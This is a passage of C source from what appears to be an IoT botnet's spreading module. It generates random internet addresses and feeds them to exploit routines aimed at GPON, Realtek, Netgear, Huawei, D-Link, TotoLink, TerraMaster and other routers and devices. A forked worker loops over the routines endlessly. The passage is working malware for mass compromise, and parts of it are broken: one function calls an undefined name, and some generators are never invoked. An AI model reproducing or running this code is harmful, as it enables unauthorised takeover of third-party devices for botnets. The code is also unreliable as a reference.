	exploit_socket_gpon8080(gpon_ip1);exploit_socket_gpon8080(gpon_ip2);exploit_socket_gpon8080(gpon_ip3);exploit_socket_gpon8080(gpon_ip4);exploit_socket_gpon8080(gpon_ip5);exploit_socket_gpon8080(gpon_ip6);
}

void GPON80_IPGen()
{
	char gpon2_ip1[16] = {0};char gpon2_ip2[16] = {0};char gpon2_ip3[16] = {0};
	char gpon2_ip4[16] = {0};char gpon2_ip5[16] = {0};char gpon2_ip6[16] = {0};
	
	srand(time(NULL));
	int gpon2_range1 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range2 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range3 = rand() % (sizeof(GPON2_Range)/sizeof(char *));
	int gpon2_range4 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range5 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range6 = rand() % (sizeof(GPON2_Range)/sizeof(char *));
	
	ipState[0] = GPON2_Range[gpon2_range1];ipState[4] = GPON2_Range[gpon2_range2];ipState[8] = GPON2_Range[gpon2_range3];
	ipState[12] = GPON2_Range[gpon2_range4];ipState[16] = GPON2_Range[gpon2_range5];ipState[20] = GPON2_Range[gpon2_range6];
	ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;
	ipState[9] = rand() % 255;ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[13] = rand() % 255;ipState[14] = rand() % 255;ipState[15] = rand() % 255;
	ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3])
		|| !checkip(ipState[8], ipState[9], ipState[10], ipState[11])
		|| !checkip(ipState[16], ipState[17], ipState[18], ipState[19]))
		GPON80_IPGen();

	sprintf(gpon2_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(gpon2_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(gpon2_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(gpon2_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(gpon2_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(gpon2_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	
	exploit_socket_gpon80(gpon2_ip1);exploit_socket_gpon80(gpon2_ip2);exploit_socket_gpon80(gpon2_ip3);exploit_socket_gpon80(gpon2_ip4);exploit_socket_gpon80(gpon2_ip5);exploit_socket_gpon80(gpon2_ip6);
}

void REALTEK_IPGen()
{	
	char realtek_ip1[16] = {0};char realtek_ip2[16] = {0};char realtek_ip3[16] = {0};char realtek_ip4[16] = {0};char realtek_ip5[16] = {0};
	char realtek_ip6[16] = {0};char realtek_ip7[16] = {0};char realtek_ip8[16] = {0};char realtek_ip9[16] = {0};char realtek_ip10[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;
	ipState[20] = rand() % 233;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;ipState[24] = rand() % 233;
	ipState[25] = rand() % 255;ipState[26] = rand() % 255;ipState[27] = rand() % 255;ipState[28] = rand() % 233;ipState[29] = rand() % 255;
	ipState[30] = rand() % 255;ipState[31] = rand() % 255;ipState[32] = rand() % 233;ipState[33] = rand() % 255;ipState[34] = rand() % 255;
	ipState[35] = rand() % 255;ipState[36] = rand() % 233;ipState[37] = rand() % 255;ipState[38] = rand() % 255;ipState[39] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3])
		|| !checkip(ipState[8], ipState[9], ipState[10], ipState[11])
		|| !checkip(ipState[16], ipState[17], ipState[18], ipState[19])
		|| !checkip(ipState[24], ipState[25], ipState[26], ipState[27])
		|| !checkip(ipState[32], ipState[33], ipState[34], ipState[35]))
		REALTEK_IPGen();

	sprintf(realtek_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(realtek_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(realtek_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(realtek_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(realtek_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(realtek_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	sprintf(realtek_ip7, "%d.%d.%d.%d", ipState[24], ipState[25], ipState[26], ipState[27]);sprintf(realtek_ip8, "%d.%d.%d.%d", ipState[28], ipState[29], ipState[30], ipState[31]);
	sprintf(realtek_ip9, "%d.%d.%d.%d", ipState[32], ipState[33], ipState[34], ipState[35]);sprintf(realtek_ip10, "%d.%d.%d.%d", ipState[36], ipState[37], ipState[38], ipState[39]);
	
	exploit_socket_realtek(realtek_ip1);exploit_socket_realtek(realtek_ip2);exploit_socket_realtek(realtek_ip3);exploit_socket_realtek(realtek_ip4);exploit_socket_realtek(realtek_ip5);
	exploit_socket_realtek(realtek_ip6);exploit_socket_realtek(realtek_ip7);exploit_socket_realtek(realtek_ip8);exploit_socket_realtek(realtek_ip9);exploit_socket_realtek(realtek_ip10);
}

void NETGEAR_IPGen()
{	
	char netgear_ip1[16] = {0};char netgear_ip2[16] = {0};char netgear_ip3[16] = {0};char netgear_ip4[16] = {0};char netgear_ip5[16] = {0};
	char netgear_ip6[16] = {0};char netgear_ip7[16] = {0};char netgear_ip8[16] = {0};char netgear_ip9[16] = {0};char netgear_ip10[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;
	ipState[20] = rand() % 233;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;ipState[24] = rand() % 233;
	ipState[25] = rand() % 255;ipState[26] = rand() % 255;ipState[27] = rand() % 255;ipState[28] = rand() % 233;ipState[29] = rand() % 255;
	ipState[30] = rand() % 255;ipState[31] = rand() % 255;ipState[32] = rand() % 233;ipState[33] = rand() % 255;ipState[34] = rand() % 255;
	ipState[35] = rand() % 255;ipState[36] = rand() % 233;ipState[37] = rand() % 255;ipState[38] = rand() % 255;ipState[39] = rand() % 255;
	
	sprintf(netgear_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(netgear_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(netgear_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(netgear_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(netgear_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(netgear_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	sprintf(netgear_ip7, "%d.%d.%d.%d", ipState[24], ipState[25], ipState[26], ipState[27]);sprintf(netgear_ip8, "%d.%d.%d.%d", ipState[28], ipState[29], ipState[30], ipState[31]);
	sprintf(netgear_ip9, "%d.%d.%d.%d", ipState[32], ipState[33], ipState[34], ipState[35]);sprintf(netgear_ip10, "%d.%d.%d.%d", ipState[36], ipState[37], ipState[38], ipState[39]);
	

	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3])
		|| !checkip(ipState[8], ipState[9], ipState[10], ipState[11])
		|| !checkip(ipState[16], ipState[17], ipState[18], ipState[19])
		|| !checkip(ipState[24], ipState[25], ipState[26], ipState[27])
		|| !checkip(ipState[32], ipState[33], ipState[34], ipState[35]))
		NETGEAR_IPGen();

	exploit_socket_netgear(netgear_ip1);exploit_socket_netgear(netgear_ip2);exploit_socket_netgear(netgear_ip3);exploit_socket_netgear(netgear_ip4);exploit_socket_netgear(netgear_ip5);
	exploit_socket_netgear(netgear_ip6);exploit_socket_netgear(netgear_ip7);exploit_socket_netgear(netgear_ip8);exploit_socket_netgear(netgear_ip9);exploit_socket_netgear(netgear_ip10);
}

void HUAWEI_IPGen()
{	
	char huawei_ip1[16] = {0};char huawei_ip2[16] = {0};char huawei_ip3[16] = {0};char huawei_ip4[16] = {0};char huawei_ip5[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;
	
	sprintf(huawei_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(huawei_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(huawei_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(huawei_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(huawei_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);
	

	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3])
		|| !checkip(ipState[8], ipState[9], ipState[10], ipState[11])
		|| !checkip(ipState[16], ipState[17], ipState[18], ipState[19]))
		HUAWEI_IPGen();

	exploit_socket_huawei(huawei_ip1);
	exploit_socket_huawei(huawei_ip2);
	exploit_socket_huawei(huawei_ip3);
	exploit_socket_huawei(huawei_ip4);
	exploit_socket_huawei(huawei_ip5);
}

void TR064_IPGen()
{	
	char tr_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	

	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		TR064_IPGen();
	sprintf(tr_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_tr064(tr_ip1);
}

void HNAP_IPGen()
{	
	char hnap_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		HNAP_IPGen();
	sprintf(hnap_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_hnap(hnap_ip1);
}

void CROSSWEB_IPGen()
{	
	char crossweb_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		CROSSWEB_IPGen();
	sprintf(crossweb_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_crossweb(crossweb_ip1);
}

void JAWS_IPGen()
{	
	char jaws_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		JAWS_IPGen();
	sprintf(jaws_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_jaws(jaws_ip1);
}

void DLINK_IPGen()
{	
	char dlink_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		DLINK_IPGen();
	sprintf(dlink_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_dlink(dlink_ip1);
}

void R7000_IPGen()
{	
	char r7000_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		DLINKR7000_IPGen_IPGen();
	sprintf(r7000_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_r7064(r7000_ip1);
}

void VARCON_IPGen()
{	
	char varcon_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		VARCON_IPGen();
	sprintf(varcon_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_vacron(varcon_ip1);
}

void AWSEC2_IPGen()
{	
	char awsec2_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		AWSEC2_IPGen();
	sprintf(awsec2_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_awsec2(awsec2_ip1);
}

void totolink_IPGen()
{	
	char toto_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		totolink_IPGen();
	sprintf(toto_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_totolinkN600R(toto_ip1);
}

void terramaster_IPGen()
{	
	char terramaster_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3]))
		terramaster_IPGen();
	sprintf(terramaster_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	
	exploit_socket_terramaster(terramaster_ip1);
}

void exploit_worker(void)
{	
	int i = 0;
    scanner_pid = fork();
	
    if (scanner_pid > 0 || scanner_pid == -1)
        return;
	restart:
	i++;
	if (i > 10)
	{
		#ifdef DEBUG
			printf("[sleep] active for 12 sec\n");
		#endif
		sleep(12);
		i = i - 10;
		goto restart;
	}
		usleep(300000);
		GPON8080_IPGen();
		usleep(300000);
		GPON80_IPGen();
		usleep(300000);
		REALTEK_IPGen();
		usleep(300000);
		NETGEAR_IPGen();
		usleep(300000);
		HUAWEI_IPGen();
		usleep(300000);
		TR064_IPGen();
		usleep(300000);
		HNAP_IPGen();
		usleep(300000);
		CROSSWEB_IPGen();
		usleep(300000);
		JAWS_IPGen();
		usleep(300000);
		DLINK_IPGen();
		usleep(300000);
		R7000_IPGen();
		usleep(300000);
		VARCON_IPGen();
    usleep(300000);
		AWSEC2_IPGen();
		goto restart;
}

void exploit_kill(void)
{
    kill(scanner_pid, 9);
}

//#endif
/*

gpon8080
gpon80
realtek
netgear
huawei
tr064
hnap
crossweb
jaws
dlink
r7000
varcon
awsec2

totolink A800R, A810R, A830R, A950RG, A3000RU, and A3100R
totolink N600R, A7100RU
totolink A860R, A3600R, T6, T10
terramaster


*/